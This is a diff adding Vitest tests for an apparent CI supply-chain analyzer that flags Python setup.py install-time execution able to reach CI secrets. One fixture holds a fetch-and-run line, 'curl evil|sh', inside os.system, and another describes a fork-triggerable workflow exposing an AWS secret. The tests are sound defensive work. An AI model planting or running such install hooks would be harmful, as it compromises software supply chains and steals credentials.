@@ -1,0 +1,71 @@
+import { describe, expect, it } from 'vitest';
+import { runEngine } from '../../engine/gate';
+import { analyzePyDeps } from './index';
+
+describe('analyzePyDeps (0028)', () => {
+  it('emits a python dependency node with an install script for setup.py', () => {
+    const r = analyzePyDeps({
+      manifests: [{ path: 'setup.py', head: 'import os; os.system("curl evil|sh")', base: null }],
+    });
+    expect(r.nodes.find((n) => n.kind === 'dependency')).toMatchObject({
+      kind: 'dependency',
+      ecosystem: 'python',
+      hasInstallScript: true,
+    });
+  });
+
+  it('adds a new-dependency entry when setup.py is added (no base)', () => {
+    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'x', base: null }] });
+    expect(r.nodes.find((n) => n.kind === 'entry')).toMatchObject({ entryKind: 'new-dependency' });
+  });
+
+  it('adds an entry when setup.py changed vs base', () => {
+    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'new', base: 'old' }] });
+    expect(r.nodes.some((n) => n.kind === 'entry')).toBe(true);
+  });
+
+  it('no entry when setup.py is unchanged — dep node still present for the runs-in edge', () => {
+    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'same', base: 'same' }] });
+    expect(r.nodes.some((n) => n.kind === 'entry')).toBe(false);
+    expect(r.nodes.some((n) => n.kind === 'dependency')).toBe(true);
+  });
+
+  it('nothing when there is no setup.py at head', () => {
+    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: null, base: 'old' }] });
+    expect(r.nodes).toHaveLength(0);
+  });
+});
+
+describe('engine: Python install-time execution reaches a CI secret (0028)', () => {
+  const WORKFLOW = [
+    'on:',
+    '  pull_request:',
+    'jobs:',
+    '  test:',
+    '    steps:',
+    '      - run: pip install .',
+    '        env:',
+    '          AWS: ${{ secrets.AWS_SECRET_ACCESS_KEY }}',
+  ].join('\n');
+
+  it('a changed setup.py in a fork-triggerable pip-install secret job is a fail', () => {
+    const result = runEngine({
+      pydeps: { manifests: [{ path: 'setup.py', head: 'malicious', base: null }] },
+      ci: { workflows: [{ path: 'ci.yml', content: WORKFLOW }] },
+    });
+    expect(result.verdict).toBe('fail');
+    const f = result.findings.find((x) => x.pathNodeIds.includes('dep:python:setup.py'));
+    expect(f, 'a Python install-time → secret path').toBeDefined();
+    expect(f!.tier).toBe('fail');
+    expect(f!.labels).toContain('ASI04:2026');
+  });
+
+  it('an unchanged setup.py with no fork-triggerable secret job does not fail', () => {
+    const PUSH = WORKFLOW.replace('  pull_request:', '  push:\n    branches: [main]');
+    const result = runEngine({
+      pydeps: { manifests: [{ path: 'setup.py', head: 'same', base: 'same' }] },
+      ci: { workflows: [{ path: 'ci.yml', content: PUSH }] },
+    });
+    expect(result.verdict).toBe('pass');
+  });
+});
